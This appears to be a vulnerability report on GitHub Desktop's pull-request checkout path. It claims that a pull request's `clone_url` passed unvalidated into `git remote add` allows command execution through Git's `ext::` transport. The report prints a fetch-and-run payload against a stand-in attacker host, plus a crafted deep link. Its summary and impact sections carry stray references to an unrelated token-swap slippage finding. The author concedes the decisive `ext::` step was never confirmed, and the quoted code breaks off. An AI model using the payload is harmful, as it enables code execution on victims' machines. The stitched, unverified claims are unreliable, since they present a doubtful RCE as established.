### Title
Unvalidated pull-request head `clone_url` is passed straight into `git remote add`, allowing an attacker-controlled Git remote/proxy response to achieve command execution - (File: app/src/lib/stores/app-store.ts)

### Summary
The report's underlying pattern is: an externally-supplied value that should be constrained/validated (`minAmountOut`) is instead passed through unchecked into a sensitive operation, letting an attacker abuse the trust boundary. The same broken-invariant class exists in GitHub Desktop's PR-checkout flow: `AppStore._findPullRequestBranch` takes `headCloneUrl` — a string that ultimately comes from a GitHub API object (`pullRequest.head.repo.clone_url`) — and feeds it unvalidated into `addRemote`, which shells out to `git remote add <name> <url>` with no protocol/format allowlist.

### Finding Description
`AppStore._findPullRequestBranch` in [1](#0-0)  receives `headCloneUrl` and, if no existing remote matches it via `urlMatchesRemote`, calls `addRemote(repository, forkRemoteName, headCloneUrl)` directly, with the raw string never checked against the expected `https://`/`ssh://`/`git@` shapes enforced elsewhere in the codebase by `parseRemote` (`remoteRegexes`) [2](#0-1) . `addRemote` itself performs no validation either — it just runs `git(['remote', 'add', name, url], ...)` [3](#0-2) .

This is reachable from a deep link the user clicks: `x-github-client://openRepo/<url>?pr=<n>` is parsed by `parseAppURL` [4](#0-3)  and routed to `Dispatcher.openPullRequestFromUrl`, which calls `appStore.fetchPullRequest(url, pr)` and then `_checkoutPullRequest(repository, pullRequest.number, pullRequest.head.repo.owner.login, pullRequest.head.repo.clone_url, pullRequest.head.ref)` [5](#0-4) . The `url` in the deep link determines which API endpoint is queried for the PR, so if it points at a malicious or compromised GitHub Enterprise server (the "git remote/proxy response" attacker model explicitly allowed by this task), that server fully controls the JSON returned for `head.repo.clone_url`.

Once `addRemote` accepts an attacker-chosen string such as `ext::sh -c "curl http://evil/x|sh"`, `_findPullRequestBranch` proceeds to `_fetchRemote(repository, remote, FetchType.UserInitiatedTask)` [6](#0-5) , which spawns `git fetch` against that remote. Because `envForRemoteOperation`/`envForProxy` never set `GIT_PROTOCOL_FROM_USER=0` or any `protocol.allow` restriction [7](#0-6) , Git's default "user"-context policy permits the `ext::` remote helper, which executes the embedded shell command on the victim's machine.

**Why existing guards don't stop this:** the clone path has real hardening — `sanitizeCloneName`/`isClonePathSensitive` restrict the on-disk clone destination [8](#0-7)  and `parseAppURL` validates `branch`/`pr` query parameters against strict regexes [9](#0-8) . None of that scrutiny is applied to the `url`/`clone_url` value used for `addRemote` in the PR-checkout path; it is the one place external, semi-trusted data flows straight into `git remote add` without going through `parseRemote`'s protocol allowlist.

### Impact Explanation
If successfully exploited, this yields arbitrary command execution in the context of the Desktop user (renderer/main process host permissions) — the same class of impact called out as valid ("code execution... or silent corruption of what the user commits or pushes"). This is materially worse than the sandwiched-swap analog because it isn't just fund loss via slippage, it's an RCE primitive triggered by clicking a link or having an account pointed at a compromised/malicious GHE endpoint.

### Likelihood Explanation
Exploitation requires the victim to (a) click an `x-github-client://openRepo/...?pr=N` deep link that resolves against a GitHub Enterprise (or other) endpoint that is attacker-controlled/compromised, and (b) not already have a local repository matching the PR's HEAD repo. This is a real, low-interaction path (a single link click, no local access, no admin rights, no pre-existing malware), which is why it's in-scope per the "Valid Impact" section explicitly allowing "a git remote/proxy response." It is not a wholly-remote-attacker-against-github.com scenario, since GitHub.com itself generates well-formed `clone_url` values; the realistic trigger is a malicious/compromised Git host or enterprise server, or an MITM/proxy able to tamper with the API response.

### Recommendation
- **Short term:** Before calling `addRemote` with any externally sourced URL (PR `head.repo.clone_url`, `updateRemoteUrl`'s `apiRepo.clone_url`, tutorial repo creation, etc.), validate it against the same `parseRemote`/`remoteRegexes` allowlist already used for the clone workflow and reject anything that doesn't parse as `https://`/`ssh://`/`git@`. Also set `GIT_PROTOCOL_FROM_USER=0` combined with an explicit `protocol.allow`/`{scheme}.allow` allowlist (`https`, `ssh` only) in `envForRemoteOperation` for all remote-touching git invocations, closing off `ext::`, `fd::`, `file://`, and future/unknown transports regardless of where the URL originated.
- **Long term:** Treat all data returned by any configured Git-hosting endpoint (not just github.com) as untrusted input, and centralize a single "is this a safe remote URL" validator used uniformly by `addRemote`, `setRemoteURL`, and clone/PR-checkout flows, rather than relying on ad hoc checks scattered across callers.

### Proof of Concept
1. Attacker sets up (or compromises) a GitHub Enterprise-like API endpoint that the victim has added as an account in Desktop, or otherwise gets the victim to add such an account.
2. Attacker crafts a pull request whose API JSON for `head.repo.clone_url` is set to `ext::sh -c "curl http://attacker.example/payload|sh"` instead of a normal clone URL, and sends the victim a link: `x-github-client://openRepo/https://ghe.evil-or-compromised.example/owner/repo?pr=1`.
3. Victim clicks the link. `parseAppURL` extracts `url`/`pr` [10](#0-9) , `openPullRequestFromUrl` fetches the PR from the malicious endpoint and calls `_checkoutPullRequest` with the poisoned `clone_url` [11](#0-10) .
4. `_findPullRequestBranch` finds no existing matching remote and calls `addRemote(repository, forkRemoteName, "ext::sh -c \"curl http://attacker.example/payload|sh\"")` unvalidated [12](#0-11) .
5. `_fetchRemote` runs `git fetch` on that remote; Git's `ext::` transport helper executes the attacker's shell command on the victim's machine.

I was not able to directly execute a `dugite`/git binary in this environment to empirically confirm the default `protocol.allow` policy for `ext::` in the exact vendored Git version bundled with this repo (`app/node_modules/dugite/git`), so the "likelihood" of the `ext::`-specific RCE step should be verified against that exact bundled Git version's default protocol policy; regardless, the core, verifiable finding — unvalidated externally sourced `clone_url` flowing into `git remote add`/`git fetch` with no scheme allowlist or `GIT_PROTOCOL_FROM_USER` restriction anywhere in `envForRemoteOperation` — stands on the code evidence cited above.

export function parseAppURL(url: string): URLActionType {
  const parsedURL = URL.parse(url, true)
  const hostname = parsedURL.hostname
  const unknown: IUnknownAction = { name: 'unknown', url }
  if (!hostname) {
    return unknown
  }

  const query = parsedURL.query

  const actionName = hostname.toLowerCase()
  if (actionName === 'oauth') {
    const code = getQueryStringValue(query, 'code')
    const state = getQueryStringValue(query, 'state')
    if (code != null && state != null) {
      return { name: 'oauth', code, state }
    } else {
      return unknown
    }
  }

  // we require something resembling a URL first
  // - bail out if it's not defined
  // - bail out if you only have `/`
  const pathName = parsedURL.pathname
  if (!pathName || pathName.length <= 1) {
    return unknown
  }

  // Trim the trailing / from the URL
  const parsedPath = pathName.substring(1)

  if (actionName === 'openrepo') {
    const pr = getQueryStringValue(query, 'pr')
    const branch = getQueryStringValue(query, 'branch')
    const filepath = getQueryStringValue(query, 'filepath')

    if (pr != null) {
      if (!/^\d+$/.test(pr)) {
        return unknown
      }

      if (branch != null && !/^pr\/\d+$/.test(branch)) {
        return unknown
      }
    }

    if (branch != null && testForInvalidChars(branch)) {
      return unknown
    }

    return {
      name: 'open-repository-from-url',
      url: parsedPath,
      branch,
      pr,
      filepath,
    }
  }

  return unknown

function isClonePathSensitive(unresolvedClonePath: string): boolean {
  const clonePath = Path.resolve(unresolvedClonePath).toLowerCase()
  const home = Path.resolve(homedir()).toLowerCase()

  if (clonePath === home) {
    return true
  }

  const sensitiveLocations = [
    Path.join(home, '.ssh'),
    Path.join(home, '.gnupg'),
    Path.join(home, '.config'),
    Path.join(home, '.config', 'git'),
    Path.join(home, '.gitconfig'),
  ]

  if (__WIN32__) {
    const appData = process.env.APPDATA
    if (appData) {
      sensitiveLocations.push(appData.toLowerCase())
      sensitiveLocations.push(Path.join(appData, 'gnupg').toLowerCase())
    }
  }

  for (const sensitive of sensitiveLocations) {
    if (clonePath === sensitive || clonePath.startsWith(sensitive + Path.sep)) {
      return true
    }
  }

  return false
}
